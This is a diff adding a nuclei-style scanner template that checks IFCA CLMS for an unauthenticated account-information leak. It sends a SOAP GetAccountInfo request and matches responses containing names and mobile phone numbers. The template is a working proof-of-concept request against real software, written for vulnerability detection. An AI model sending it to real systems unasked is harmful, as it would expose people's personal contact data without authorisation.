@@ -1,0 +1,34 @@
+id: poc-yaml-ifca-clms-account-info-leak
+info:
+  name: IFCA CLMS Account Information Disclosure
+  author: ProjectDiscoveryAI
+  severity: medium
+  tags: information-disclosure
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/rental/contract/api/account.asmx"
+    headers:
+      Content-Type: text/xml; charset=utf-8
+      Soapaction: "http://tempuri.org/GetAccountInfo"
+    body: |
+      <?xml version="1.0" encoding="utf-8"?>
+      <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+        <soap:Body>
+          <GetAccountInfo xmlns="http://tempuri.org/" />
+        </soap:Body>
+      </soap:Envelope>
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "GetAccountInfoResponse"
+      - type: regex
+        part: body
+        regex:
+          - "\"Name\":\"[\u4e00-\u9fa5A-Z]+\""
+          - "\"ContactMobilePhone\":\"[0-9-]+\""
